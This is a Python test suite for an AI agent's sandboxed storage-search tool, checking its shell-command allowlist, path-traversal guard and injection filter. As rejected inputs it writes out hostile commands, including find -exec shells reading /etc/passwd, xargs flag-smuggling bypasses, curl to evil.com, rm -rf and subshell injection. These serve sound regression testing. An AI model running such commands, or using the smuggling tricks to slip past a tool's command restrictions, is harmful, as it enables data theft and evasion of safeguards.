"""Comprehensive tests for app.agents.actions.storage_search.storage_search.

Covers all 9 test categories from the plan:
  1. Command allowlist enforcement
  2. Path traversal security
  3. Output handling (truncation, empty, stderr)
  4. Timeout and process management
  5. Date filtering
  6. Connector / path resolution
  7. Return format (SSE compatibility)
  8. Pipe support
  9. Integration-style (mocked subprocess)
"""

from __future__ import annotations

import asyncio
import os
import platform
from datetime import datetime, timedelta, timezone
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from app.agents.actions.storage_search.storage_search import (
    RunCommandInput,
    StoragePatternMatch,
    _ALLOWED_BINARIES,
    _MAX_OUTPUT_CHARS,
    _build_date_filtered_command,
    _resolve_mount_root,
    _run_subprocess,
    _truncate,
    _validate_command,
    is_local_storage,
)


# ──────────────────────────────────────────────────────────────────────────────
# Shared fixtures / helpers
# ──────────────────────────────────────────────────────────────────────────────

def _make_state(**overrides) -> dict:
    """Minimal ChatState-like dict for unit tests."""
    config_service = AsyncMock()
    config_service.get_config = AsyncMock(
        return_value={"storageType": "local", "mountName": "PipesHub"}
    )
    state = {
        "org_id": "org-test-123",
        "user_id": "user-abc",
        "conversation_id": "conv-xyz",
        "config_service": config_service,
        "graph_provider": MagicMock(),
        "logger": MagicMock(),
    }
    state.update(overrides)
    return state


def _make_tool(connector_dir: str | None = None, **state_overrides) -> StoragePatternMatch:
    """Instantiate StoragePatternMatch with optional connector_dir override."""
    state = _make_state(**state_overrides)
    t = StoragePatternMatch(state)
    if connector_dir is not None:
        async def _mock_resolve(cid: str):
            return connector_dir, None
        t._resolve_connector_path = _mock_resolve  # type: ignore[method-assign]
    return t


# ──────────────────────────────────────────────────────────────────────────────
# 1. Command allowlist tests
# ──────────────────────────────────────────────────────────────────────────────

class TestCommandAllowlist:

    @pytest.mark.parametrize("cmd", [
        'grep -r "pattern" .',
        'rg --json "error" .',
        'find . -name "*.json"',
        'ls -la .',
        'wc -l .',
        'cat somefile.json',
        'sort file.json | uniq',
    ])
    def test_allowed_commands_pass(self, cmd: str):
        valid, err = _validate_command(cmd)
        assert valid, f"Expected allowed but got error: {err}"
        assert err == ""

    def test_blocked_rm_rejected(self):
        valid, err = _validate_command("rm -rf .")
        assert not valid
        assert "'rm' is not allowed" in err
        assert "Allowed commands:" in err

    def test_blocked_awk_rejected(self):
        # awk is excluded entirely -- its system()/getline builtins shell out
        # to arbitrary commands from within the program text.
        valid, err = _validate_command("awk '/pattern/' file.json")
        assert not valid
        assert "'awk' is not allowed" in err

    @pytest.mark.parametrize("cmd", [
        'find . -exec sh -c "cat /etc/passwd" {} +',
        'find . -execdir id {} +',
        'find . -ok rm {} +',
        'find . -okdir rm {} +',
        'find . -fprintf out.txt "%p\\n"',
        'find . -fprint out.txt',
    ])
    def test_blocked_find_exec_variants_rejected(self, cmd: str):
        valid, err = _validate_command(cmd)
        assert not valid, f"Expected '{cmd}' to be rejected"
        assert "is not allowed with 'find'" in err

    @pytest.mark.parametrize("cmd", [
        'rg --pre sh --pre-glob "*" "pattern" .',
        'rg --pre=sh "pattern" .',
    ])
    def test_blocked_rg_pre_rejected(self, cmd: str):
        valid, err = _validate_command(cmd)
        assert not valid, f"Expected '{cmd}' to be rejected"
        assert "is not allowed with 'rg'" in err

    def test_blocked_xargs_wrapped_find_exec_rejected(self):
        # -exec must also be caught when find is invoked as an xargs
        # sub-command, not just as the top-level binary.
        cmd = 'grep -rlZ "x" . | xargs -0 find -exec sh -c "id" {} +'
        valid, err = _validate_command(cmd)
        assert not valid
        assert "is not allowed with 'find'" in err

    def test_blocked_double_xargs_wrapped_find_exec_rejected(self):
        # xargs's own sub-command can itself be xargs (xargs -0 xargs find
        # ...) -- this must still surface find's -exec, not stop at the
        # inner xargs (which has no dangerous-flags entry of its own).
        cmd = 'grep -rlZ "x" . | xargs -0 xargs find . -exec sh -c "id" {} +'
        valid, err = _validate_command(cmd)
        assert not valid
        assert "is not allowed with 'find'" in err

    def test_blocked_triple_xargs_wrapped_find_exec_rejected(self):
        # The nesting walk must not be hardcoded to exactly two levels --
        # three (or more) layers of xargs must still be unwound to reach
        # find's -exec.
        cmd = 'grep -rlZ "x" . | xargs -0 xargs xargs find . -exec sh -c "id" {} +'
        valid, err = _validate_command(cmd)
        assert not valid
        assert "is not allowed with 'find'" in err

    def test_double_xargs_with_safe_subcommand_passes(self):
        # Nested xargs is not inherently dangerous -- only unwrap far enough
        # to check dangerous flags on the eventual sub-command, an
        # intentionally-nested but safe pipeline must still validate.
        cmd = 'grep -rl "x" . | xargs -0 xargs grep -i "term"'
        valid, err = _validate_command(cmd)
        assert valid, f"Expected valid but got: {err}"

    # ------------------------------------------------------------------
    # xargs value-consuming-flag bypass (security fix regression tests)
    # ------------------------------------------------------------------
    #
    # `-I`, `-L`, `-n`, `-P`, `-s`, `-a`, `-d`, `-E`, `-e` (and deprecated
    # aliases `-i`, `-l`) all consume a SEPARATE value token that itself
    # doesn't start with "-". Picking "the first token not starting with
    # -" as xargs's sub-command mistakes that value for the real
    # sub-command, letting the actual invoked binary (further down the
    # token list, e.g. `find -exec sh -c ...`) slip past validation.

    def test_blocked_xargs_value_flag_smuggle_reported_bypass(self):
        # The exact bypass reported: -I's value "cat" is an allowed binary
        # with no dangerous flags, so the naive scan picked it as the
        # sub-command and never looked at `find -exec` a few tokens later.
        cmd = 'grep -rlZ "x" . | xargs -0 -I cat find . -exec sh -c "id" {} +'
        valid, err = _validate_command(cmd)
        assert not valid, f"Expected bypass command to be rejected, got: {err}"
        assert "is not allowed with 'find'" in err

    @pytest.mark.parametrize("flag", ["-L", "-n", "-P", "-s"])
    def test_blocked_xargs_other_value_flags_smuggle_variants(self, flag: str):
        # Same bypass shape with -L/-n/-P/-s standing in for -I: the flag's
        # value ("cat") must not be mistaken for the sub-command, and the
        # real sub-command's -exec must still be caught.
        cmd = f'xargs -0 {flag} cat find . -exec sh -c "id" {{}} +'
        valid, err = _validate_command(cmd)
        assert not valid, f"Expected '{cmd}' to be rejected"
        assert "is not allowed with 'find'" in err

    def test_blocked_xargs_deprecated_alias_value_flag_smuggle(self):
        # -i is the deprecated alias for -I; must be treated as value-
        # consuming too (erring toward the safe/over-skipping direction).
        cmd = 'xargs -0 -i cat find . -exec sh -c "id" {} +'
        valid, err = _validate_command(cmd)
        assert not valid, f"Expected '{cmd}' to be rejected"
        assert "is not allowed with 'find'" in err

    def test_legitimate_xargs_dash_i_replace_str_passes(self):
        # Standard, documented xargs -I usage (replace-str placeholder)
        # must not be broken by the value-consuming-flag fix.
        cmd = 'xargs -I {} grep -i "term" {}'
        valid, err = _validate_command(cmd)
        assert valid, f"Expected legitimate -I usage to pass, got: {err}"

    def test_legitimate_xargs_dash_n_max_args_passes(self):
        # -n max-args with a numeric value ahead of a safe sub-command.
        cmd = 'xargs -n 1 echo'
        valid, err = _validate_command(cmd)
        assert valid, f"Expected legitimate -n usage to pass, got: {err}"

    def test_legitimate_pipe_xargs_dash_i_from_docstring_pattern(self):
        # Mirrors the find + xargs -I pattern implied by this module's own
        # llm_description examples (null-terminated find piped to xargs).
        cmd = 'find . -name "*.json" -print0 | xargs -0 -I {} grep -il "keyword" {}'
        valid, err = _validate_command(cmd)
        assert valid, f"Expected valid but got: {err}"

    def test_blocked_xargs_value_flag_smuggle_with_nested_xargs(self):
        # Combine the value-flag bypass with nested xargs: the -I value
        # must be skipped correctly at EVERY nesting level, not just the
        # outermost xargs.
        cmd = (
            'grep -rlZ "x" . | xargs -0 xargs -I cat find . '
            '-exec sh -c "id" {} +'
        )
        valid, err = _validate_command(cmd)
        assert not valid, f"Expected '{cmd}' to be rejected"
        assert "is not allowed with 'find'" in err

    def test_xargs_trailing_valueless_flag_does_not_crash(self):
        # A bare, trailing -I with nothing after it must not raise an
        # IndexError -- treated as "no sub-command found", i.e. allowed
        # (matching the pre-existing behavior for an empty non_flag_args).
        cmd = "xargs -0 -I"
        valid, err = _validate_command(cmd)
        assert valid, f"Expected trailing bare -I to be allowed, got: {err}"

    def test_blocked_curl_rejected(self):
        valid, err = _validate_command("curl http://evil.com")
        assert not valid
        assert "'curl' is not allowed" in err

    def test_blocked_python_rejected(self):
        valid, err = _validate_command("python -c 'import os'")
        assert not valid
        assert "'python' is not allowed" in err

    def test_blocked_chmod_rejected(self):
        valid, err = _validate_command("chmod 777 file")
        assert not valid
        assert "'chmod' is not allowed" in err

    def test_blocked_mv_rejected(self):
        valid, err = _validate_command("mv file.json other.json")
        assert not valid
        assert "'mv' is not allowed" in err

    def test_blocked_cp_rejected(self):
        valid, err = _validate_command("cp file.json /tmp/out")
        assert not valid
        assert "'cp' is not allowed" in err

    def test_blocked_sh_rejected(self):
        valid, err = _validate_command("sh -c 'echo hello'")
        assert not valid
        assert "'sh' is not allowed" in err

    def test_empty_command_rejected(self):
        valid, err = _validate_command("")
        assert not valid
        assert "empty command" in err

    def test_whitespace_only_rejected(self):
        valid, err = _validate_command("   ")
        assert not valid
        assert "empty command" in err


# ──────────────────────────────────────────────────────────────────────────────
# 2. Path traversal security tests
# ──────────────────────────────────────────────────────────────────────────────

class TestPathTraversalSecurity:

    def test_dotdot_in_path_rejected(self):
        valid, err = _validate_command('grep -r "x" ../other_connector/')
        assert not valid
        assert "path traversal" in err
        assert ".." in err

    def test_absolute_path_rejected(self):
        valid, err = _validate_command('grep -r "x" /etc/passwd')
        assert not valid
        assert "absolute paths" in err

    def test_dotdot_in_find_rejected(self):
        valid, err = _validate_command('find ../../ -name "*.json"')
        assert not valid
        assert "path traversal" in err

    def test_absolute_path_in_find_rejected(self):
        valid, err = _validate_command('find /proc/self -name "*.json"')
        assert not valid
        assert "absolute paths" in err

    def test_relative_path_within_scope_allowed(self):
        valid, err = _validate_command('grep -r "x" ./subfolder/')
        assert valid, f"Expected allowed but got: {err}"

    def test_dotdot_embedded_in_subpath_rejected(self):
        valid, err = _validate_command('grep -r "x" subdir/../../../etc/')
        assert not valid
        assert "path traversal" in err

    def test_injection_semicolon_rejected(self):
        valid, err = _validate_command('grep "x" .; rm -rf .')
        assert not valid
        assert "not allowed" in err

    def test_injection_double_ampersand_rejected(self):
        valid, err = _validate_command('grep "x" . && curl evil.com')
        assert not valid
        # Caught by _INJECTION_RE before reaching allowlist check
        assert "not allowed" in err

    def test_injection_redirect_rejected(self):
        valid, err = _validate_command('grep "x" . > /tmp/out')
        assert not valid

    def test_injection_subshell_rejected(self):
        valid, err = _validate_command('grep $(cat /etc/passwd) .')
        assert not valid

    def test_injection_backtick_rejected(self):
        valid, err = _validate_command('grep `cat /etc/passwd` .')
        assert not valid


# ──────────────────────────────────────────────────────────────────────────────
# 3. Output handling tests
# ──────────────────────────────────────────────────────────────────────────────

class TestOutputHandling:

    def test_truncation_helper_no_truncation(self):
        text = "a" * 100
        assert _truncate(text, 200) == text

    def test_truncation_helper_truncates_at_limit(self):
        text = "a" * 20_000
        result = _truncate(text, _MAX_OUTPUT_CHARS)
        assert len(result) > _MAX_OUTPUT_CHARS  # includes the trailer
        assert result[:_MAX_OUTPUT_CHARS] == "a" * _MAX_OUTPUT_CHARS
        assert "truncated" in result
        assert "20000" in result

    def test_truncation_exact_boundary(self):
        text = "b" * _MAX_OUTPUT_CHARS
        assert _truncate(text, _MAX_OUTPUT_CHARS) == text

    @pytest.mark.asyncio
    async def test_empty_stdout_returns_no_matches(self, tmp_path):
        """grep exits 1 with no stderr → treated as 'No matches found'."""
        success, output = await _run_subprocess(
            "grep -r 'zzz_nonexistent_xyz' .",
            cwd=str(tmp_path),
            use_shell=False,
        )
        assert success is True
        assert "No matches found" in output

    @pytest.mark.asyncio
    async def test_successful_grep_returns_output(self, tmp_path):
        (tmp_path / "record.json").write_text('{"title": "hello world"}')
        success, output = await _run_subprocess(
            "grep -r 'hello' .",
            cwd=str(tmp_path),
            use_shell=False,
        )
        assert success is True
        assert "hello" in output

    @pytest.mark.asyncio
    async def test_output_truncated_to_max(self, tmp_path):
        """Produce output > MAX_OUTPUT_CHARS and verify truncation."""
        big = "\n".join(f"line {i}: " + "x" * 200 for i in range(200))
        (tmp_path / "big.json").write_text(big)
        success, output = await _run_subprocess(
            "cat big.json",
            cwd=str(tmp_path),
            use_shell=False,
        )
        assert success is True
        if len(big) > _MAX_OUTPUT_CHARS:
            assert "truncated" in output

    @pytest.mark.asyncio
    async def test_nonzero_exit_with_stderr_returns_false(self, tmp_path):
        """Invalid regex causes grep to exit 2 with stderr."""
        success, output = await _run_subprocess(
            'grep -E "[invalid" .',
            cwd=str(tmp_path),
            use_shell=False,
        )
        assert success is False
        assert "exit" in output.lower() or "failed" in output.lower()


# ──────────────────────────────────────────────────────────────────────────────
# 4. Timeout and process management tests
# ──────────────────────────────────────────────────────────────────────────────

class TestTimeoutAndProcessManagement:

    @pytest.mark.asyncio
    async def test_timeout_returns_error_tuple(self, tmp_path):
        """Simulate timeout by patching wait_for to raise TimeoutError immediately."""
        with patch(
            "asyncio.wait_for",
            side_effect=asyncio.TimeoutError,
        ):
            with patch("asyncio.create_subprocess_exec") as mock_exec:
                mock_proc = AsyncMock()
                mock_proc.returncode = None
                mock_proc.kill = MagicMock()
                mock_proc.communicate = AsyncMock(return_value=(b"", b""))
                mock_exec.return_value = mock_proc

                success, output = await _run_subprocess(
                    "find . -name '*.json'",
                    cwd=str(tmp_path),
                    use_shell=False,
                    timeout=1,
                )

        assert success is False
        assert "timed out" in output

    @pytest.mark.asyncio
    async def test_process_killed_on_timeout(self, tmp_path):
        """kill() is called synchronously when wait_for raises TimeoutError."""
        kill_called = []

        def _kill_impl():
            kill_called.append(True)

        with patch(
            "asyncio.wait_for",
            side_effect=asyncio.TimeoutError,
        ):
            with patch("asyncio.create_subprocess_exec") as mock_exec:
                mock_proc = AsyncMock()
                mock_proc.returncode = None
                mock_proc.kill = _kill_impl
                mock_proc.communicate = AsyncMock(return_value=(b"", b""))
                mock_exec.return_value = mock_proc

                await _run_subprocess(
                    "find . -name '*.json'",
                    cwd=str(tmp_path),
                    use_shell=False,
                    timeout=1,
                )

        assert kill_called, "Process was not killed on timeout"

    @pytest.mark.asyncio
    async def test_normal_command_completes_quickly(self, tmp_path):
        (tmp_path / "test.json").write_text("{}")
        success, output = await _run_subprocess(
            "ls .",
            cwd=str(tmp_path),
            use_shell=False,
            timeout=5,
        )
        assert success is True
        assert "test.json" in output


# ──────────────────────────────────────────────────────────────────────────────
# 5. Date filtering tests
# ──────────────────────────────────────────────────────────────────────────────

class TestDateFiltering:

    def test_valid_date_produces_newermt_command(self):
        ok, result = _build_date_filtered_command("grep -r 'x' .", "2026-06-01")
        assert ok is True
        assert "newermt" in result
        assert "grep" in result
        assert "2026-05-31" in result  # one day before
        assert "2026-06-03" in result  # two days after

    def test_date_filter_contains_json_filter(self):
        ok, result = _build_date_filtered_command("grep -r 'x' .", "2026-06-01")
        assert ok is True
        assert "*.json" in result
        assert "xargs" in result

    def test_invalid_date_format_returns_error(self):
        ok, result = _build_date_filtered_command("grep -r 'x' .", "not-a-date")
        assert ok is False
        assert "invalid record_date format" in result

    def test_date_wrong_separator_rejected(self):
        ok, result = _build_date_filtered_command("grep -r 'x' .", "2026/06/01")
        assert ok is False
        assert "invalid record_date format" in result

    def test_no_date_no_filter(self):
        valid, err = _validate_command("grep -r 'x' .")
        assert valid
        # No date filter injected — command unchanged

    @pytest.mark.asyncio
    async def test_record_date_sets_use_shell(self, tmp_path):
        """When record_date is given, effective_command uses shell pipeline."""
        tool = _make_tool(connector_dir=str(tmp_path))
        # Create a json file so the dir exists
        (tmp_path / "r.json").write_text('{"title":"hello"}')

        with patch(
            "app.agents.actions.storage_search.storage_search._run_subprocess",
            new_callable=AsyncMock,
        ) as mock_run:
            mock_run.return_value = (True, "No matches found.")
            await tool.run_command(
                connector_id="conn-abc",
                command="grep -r 'hello' .",
                record_date="2026-06-01",
            )

        assert mock_run.called
        _, kwargs = mock_run.call_args
        assert kwargs.get("use_shell") is True


# ──────────────────────────────────────────────────────────────────────────────
# 6. Connector / path resolution tests
# ──────────────────────────────────────────────────────────────────────────────

class TestConnectorPathResolution:

    def test_mount_root_linux(self):
        with patch("platform.system", return_value="Linux"):
            root = _resolve_mount_root("PipesHub")
        home = os.path.expanduser("~")
        assert root == os.path.join(home, ".local", "PipesHub")

    def test_mount_root_macos(self):
        with patch("platform.system", return_value="Darwin"):
            root = _resolve_mount_root("PipesHub")
        home = os.path.expanduser("~")
        assert root == os.path.join(home, "Library", "PipesHub")

    def test_mount_root_windows(self):
        with patch("platform.system", return_value="Windows"):
            root = _resolve_mount_root("PipesHub")
        home = os.path.expanduser("~")
        assert root == os.path.join(home, "AppData", "PipesHub")

    def test_custom_mount_name_used(self):
        with patch("platform.system", return_value="Linux"):
            root = _resolve_mount_root("MyMountName")
        assert "MyMountName" in root

    @pytest.mark.asyncio
    async def test_valid_connector_resolves_path(self, tmp_path):
        """Config returns local storage; connector dir exists → resolves ok."""
        connector_dir = tmp_path / "org-1" / "PipesHub" / "records" / "conn-id"
        connector_dir.mkdir(parents=True)

        state = _make_state()
        state["org_id"] = "org-1"
        state["config_service"].get_config = AsyncMock(
            return_value={"storageType": "local", "mountName": "PipesHub"}
        )
        tool = StoragePatternMatch(state)

        with patch(
            "app.agents.actions.storage_search.storage_search._resolve_mount_root",
            return_value=str(tmp_path),
        ):
            path, err = await tool._resolve_connector_path("conn-id")

        assert err is None
        assert path is not None
        assert os.path.isdir(path)

    @pytest.mark.asyncio
    async def test_nonexistent_connector_returns_error(self, tmp_path):
        state = _make_state()
        state["org_id"] = "org-1"
        tool = StoragePatternMatch(state)

        with patch(
            "app.agents.actions.storage_search.storage_search._resolve_mount_root",
            return_value=str(tmp_path),
        ):
            path, err = await tool._resolve_connector_path("no-such-connector")

        assert path is None
        assert err is not None
        assert "no records directory found" in err

    @pytest.mark.asyncio
    async def test_cloud_storage_type_returns_error(self):
        state = _make_state()
        state["config_service"].get_config = AsyncMock(
            return_value={"storageType": "s3", "mountName": "PipesHub"}
        )
        tool = StoragePatternMatch(state)
        path, err = await tool._resolve_connector_path("conn-id")
        assert path is None
        assert "local storage" in err
        assert "s3" in err

    @pytest.mark.asyncio
    async def test_missing_org_id_returns_error(self):
        state = _make_state(org_id="")
        tool = StoragePatternMatch(state)
        path, err = await tool._resolve_connector_path("conn-id")
        assert path is None
        assert "org_id" in err

    @pytest.mark.asyncio
    async def test_missing_config_service_returns_error(self):
        state = _make_state()
        state["config_service"] = None
        tool = StoragePatternMatch(state)
        path, err = await tool._resolve_connector_path("conn-id")
        assert path is None
        assert "config_service" in err


# ──────────────────────────────────────────────────────────────────────────────
# 7. Return format tests (SSE compatibility)
# ──────────────────────────────────────────────────────────────────────────────

class TestReturnFormat:
    """Ensure the tool always returns tuple[bool, str] so that
    _detect_tool_result_status in nodes.py can correctly classify results
    and _ToolStreamingCallback can emit the right SSE events."""

    @pytest.mark.asyncio
    async def test_success_returns_tuple_true(self, tmp_path):
        (tmp_path / "r.json").write_text('{"title":"hello"}')
        tool = _make_tool(connector_dir=str(tmp_path))
        result = await tool.run_command("conn-id", "grep -r 'hello' .")
        assert isinstance(result, tuple) and len(result) == 2
        success, output = result
        assert success is True
        assert isinstance(output, str)
        assert len(output) > 0

    @pytest.mark.asyncio
    async def test_error_returns_tuple_false(self):
        tool = _make_tool(connector_dir="/some/path")
        result = await tool.run_command("conn-id", "rm -rf .")
        assert isinstance(result, tuple) and len(result) == 2
        success, output = result
        assert success is False
        assert isinstance(output, str)
        assert "not allowed" in output

    @pytest.mark.asyncio
    async def test_path_error_returns_tuple_false(self):
        """Connector dir not found → (False, error message)."""
        state = _make_state()

        async def _fail_resolve(cid):
            return None, "Error: no records directory found for connector 'conn-id'"

        tool = StoragePatternMatch(state)
        tool._resolve_connector_path = _fail_resolve  # type: ignore[method-assign]

        result = await tool.run_command("conn-id", "grep -r 'x' .")
        success, output = result
        assert success is False
        assert "no records directory" in output

    def test_sse_tool_name_parses_correctly(self):
        """Verify that the tool name storage_pattern_match.run_command is parsed
        correctly by _get_tool_status_message (from nodes.py) into a human-readable
        status string: 'Storage pattern match: run command...'"""
        # Re-implement the same logic from nodes.py _get_tool_status_message
        tool_name = "storage_pattern_match.run_command"
        if "." in tool_name:
            app_name, action_part = tool_name.split(".", 1)
        else:
            app_name = None
            action_part = tool_name
        action_readable = action_part.replace("_", " ").strip()
        app_display = app_name.replace("_", " ").title() if app_name else ""
        status_msg = f"{app_display}: {action_readable}..." if app_name else f"{action_readable}..."
        assert "Storage Pattern Match" in status_msg
        assert "run command" in status_msg

    def test_success_tuple_detected_as_success(self):
        """Simulate _detect_tool_result_status logic from nodes.py line 7824."""
        result = (True, "grep output: match found")
        # nodes.py checks isinstance(result_content, (tuple, list)) and len == 2
        # then uses result_content[0] as success flag indirectly via str conversion
        # The actual check in _detect_tool_result_status:
        # - It converts to string or parses JSON and checks for error keywords
        # Tuple (True, ...) means the outer wrapper.py returns str(result) = "(True, ...)"
        # But RegistryToolWrapper._format_result at line 737 does:
        #   if isinstance(result, (tuple, list)) and len(result) == TOOL_RESULT_TUPLE_LENGTH:
        #       success, result_data = result
        #       return str(result_data)   ← just returns the string part
        # So _detect_tool_result_status receives the string part only.
        # Success string should not contain error keywords.
        _, msg = result
        error_keywords = ("error", "failed", "exception", "traceback", "not allowed")
        has_error = any(kw in msg.lower() for kw in error_keywords)
        assert not has_error

    def test_error_tuple_detected_as_error(self):
        """Error string contains 'error' keyword → _detect_tool_result_status = 'error'."""
        result = (False, "Error: command 'rm' is not allowed. Allowed commands: ...")
        _, msg = result
        error_keywords = ("error", "failed", "exception")
        has_error = any(kw in msg.lower() for kw in error_keywords)
        assert has_error


# ──────────────────────────────────────────────────────────────────────────────
# 8. Pipe support tests
# ──────────────────────────────────────────────────────────────────────────────

class TestPipeSupport:

    def test_pipe_grep_to_head_passes_validation(self):
        valid, err = _validate_command("grep -r 'x' . | head -10")
        assert valid, f"Expected valid but got: {err}"

    def test_pipe_find_to_xargs_grep_passes(self):
        valid, err = _validate_command(
            "find . -name '*.json' | xargs grep 'pattern'"
        )
        assert valid, f"Expected valid but got: {err}"

    def test_pipe_with_blocked_command_rejected(self):
        valid, err = _validate_command("grep 'x' . | rm file")
        assert not valid
        assert "'rm' is not allowed" in err

    def test_pipe_with_curl_rejected(self):
        valid, err = _validate_command("grep 'x' . | curl http://evil.com")
        assert not valid
        assert "'curl' is not allowed" in err

    def test_pipe_empty_stage_rejected(self):
        valid, err = _validate_command("grep 'x' . |")
        assert not valid
        assert "empty" in err.lower()

    def test_pipe_leading_pipe_rejected(self):
        valid, err = _validate_command("| grep 'x' .")
        assert not valid

    @pytest.mark.asyncio
    async def test_pipe_command_uses_shell(self, tmp_path):
        """Commands containing | must be executed with use_shell=True."""
        (tmp_path / "r.json").write_text('{"title":"hello"}')
        tool = _make_tool(connector_dir=str(tmp_path))

        with patch(
            "app.agents.actions.storage_search.storage_search._run_subprocess",
            new_callable=AsyncMock,
        ) as mock_run:
            mock_run.return_value = (True, "hello")
            await tool.run_command("conn-id", "grep -r 'hello' . | head -5")

        _, kwargs = mock_run.call_args
        assert kwargs["use_shell"] is True

    @pytest.mark.asyncio
    async def test_simple_command_uses_exec_not_shell(self, tmp_path):
        """Commands without | must use create_subprocess_exec (use_shell=False)."""
        (tmp_path / "r.json").write_text('{"title":"hello"}')
        tool = _make_tool(connector_dir=str(tmp_path))

        with patch(
            "app.agents.actions.storage_search.storage_search._run_subprocess",
            new_callable=AsyncMock,
        ) as mock_run:
            mock_run.return_value = (True, "hello")
            await tool.run_command("conn-id", "grep -r 'hello' .")

        _, kwargs = mock_run.call_args
        assert kwargs["use_shell"] is False

    @pytest.mark.asyncio
    async def test_pipe_executes_correctly(self, tmp_path):
        """Functional pipe test: grep ... | head -1 returns only one line."""
        for i in range(5):
            (tmp_path / f"r{i}.json").write_text(f'{{"title":"hello {i}"}}')
        tool = _make_tool(connector_dir=str(tmp_path))

        success, output = await tool.run_command(
            "conn-id",
            "grep -rh 'hello' . | head -1",
        )
        assert success is True
        lines = [l for l in output.splitlines() if l.strip()]
        assert len(lines) == 1


# ──────────────────────────────────────────────────────────────────────────────
# 9. Integration-style tests (mocked subprocess)
# ──────────────────────────────────────────────────────────────────────────────

class TestIntegration:

    @pytest.mark.asyncio
    async def test_full_flow_grep_search(self, tmp_path):
        """Full pipeline: valid command → path resolves → subprocess returns match."""
        tool = _make_tool(connector_dir=str(tmp_path))
        (tmp_path / "doc.json").write_text('{"title": "deployment guide"}')

        success, output = await tool.run_command(
            "conn-test", "grep -r 'deployment' ."
        )

        assert success is True
        assert "deployment" in output

    @pytest.mark.asyncio
    async def test_full_flow_no_records_directory(self):
        """When connector dir does not exist, returns graceful error."""
        state = _make_state()
        tool = StoragePatternMatch(state)

        with patch(
            "app.agents.actions.storage_search.storage_search._resolve_mount_root",
            return_value="/nonexistent/path",
        ):
            success, output = await tool.run_command(
                "missing-connector", "grep -r 'x' ."
            )

        assert success is False
        assert "no records directory found" in output

    @pytest.mark.asyncio
    async def test_full_flow_subprocess_exception(self, tmp_path):
        """If subprocess raises an unexpected exception, returns (False, error)."""
        tool = _make_tool(connector_dir=str(tmp_path))

        with patch(
            "asyncio.create_subprocess_exec",
            side_effect=OSError("exec failed"),
        ):
            success, output = await tool.run_command(
                "conn-id", "grep -r 'x' ."
            )

        assert success is False
        assert "Error" in output

    @pytest.mark.asyncio
    async def test_state_extraction(self, tmp_path):
        """org_id and config_service are read correctly from state."""
        connector_dir = tmp_path / "my-org" / "PipesHub" / "records" / "c1"
        connector_dir.mkdir(parents=True)
        (connector_dir / "r.json").write_text('{"x":1}')

        state = _make_state()
        state["org_id"] = "my-org"
        state["config_service"].get_config = AsyncMock(
            return_value={"storageType": "local", "mountName": "PipesHub"}
        )
        tool = StoragePatternMatch(state)

        with patch(
            "app.agents.actions.storage_search.storage_search._resolve_mount_root",
            return_value=str(tmp_path),
        ):
            success, output = await tool.run_command("c1", "ls .")

        assert success is True
        assert "r.json" in output

    @pytest.mark.asyncio
    async def test_command_validation_short_circuits_before_subprocess(self):
        """Invalid command never reaches subprocess."""
        state = _make_state()
        tool = StoragePatternMatch(state)

        with patch("asyncio.create_subprocess_exec") as mock_exec, \
             patch("asyncio.create_subprocess_shell") as mock_shell:
            success, output = await tool.run_command("conn", "rm -rf .")
            mock_exec.assert_not_called()
            mock_shell.assert_not_called()

        assert success is False

    @pytest.mark.asyncio
    async def test_imports(self):
        """Smoke test: module and class importable."""
        from app.agents.actions.storage_search.storage_search import StoragePatternMatch
        assert StoragePatternMatch is not None

    @pytest.mark.asyncio
    async def test_find_command_full_flow(self, tmp_path):
        """find . -name '*.json' returns the file."""
        (tmp_path / "record.json").write_text('{"data": 1}')
        tool = _make_tool(connector_dir=str(tmp_path))

        success, output = await tool.run_command(
            "conn-id", "find . -name '*.json'"
        )
        assert success is True
        assert "record.json" in output

    @pytest.mark.asyncio
    async def test_wc_count_files(self, tmp_path):
        """wc -l counts newlines; write file with trailing newline so count matches."""
        content = "\n".join(["line"] * 10) + "\n"
        (tmp_path / "r.json").write_text(content)
        tool = _make_tool(connector_dir=str(tmp_path))

        success, output = await tool.run_command("conn-id", "wc -l r.json")
        assert success is True
        assert "10" in output


# ──────────────────────────────────────────────────────────────────────────────
# is_local_storage
# ──────────────────────────────────────────────────────────────────────────────

class TestIsLocalStorage:

    def test_local_lowercase(self):
        assert is_local_storage({"storageType": "local"}) is True

    def test_local_uppercase(self):
        assert is_local_storage({"storageType": "LOCAL"}) is True

    def test_s3_is_not_local(self):
        assert is_local_storage({"storageType": "s3"}) is False

    def test_azure_is_not_local(self):
        assert is_local_storage({"storageType": "azure"}) is False

    def test_missing_storage_type_key_defaults_local(self):
        assert is_local_storage({}) is True

    def test_none_config_defaults_local(self):
        assert is_local_storage(None) is True
